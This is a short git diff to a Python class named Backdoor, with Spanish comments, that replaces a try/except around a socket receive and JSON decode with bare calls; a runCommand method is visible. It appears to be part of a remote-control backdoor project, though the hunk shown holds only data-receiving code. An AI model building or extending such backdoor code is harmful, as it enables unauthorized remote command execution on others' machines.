@@ -25,11 +25,13 @@ class Backdoor:
         #Al usar un bucle, la función de recibir datos se ejecuta una y otra vez.
         #De esta manera nos aseguramos de que todos los paquetes sean recividos, evitando que se pierda alguno.
         #Así aseguramos la integridad de los mismos
-            try:
+            '''try:
                 jsonData = self.connection.recv(1024)
                 return json.loads(jsonData.decode('utf-8'))
 
-            except ValueError: continue
+            except ValueError: continue'''
+            jsonData = self.connection.recv(1024)
+            return json.loads(jsonData.decode('utf-8'))
     
     def runCommand(self, command):
         try:
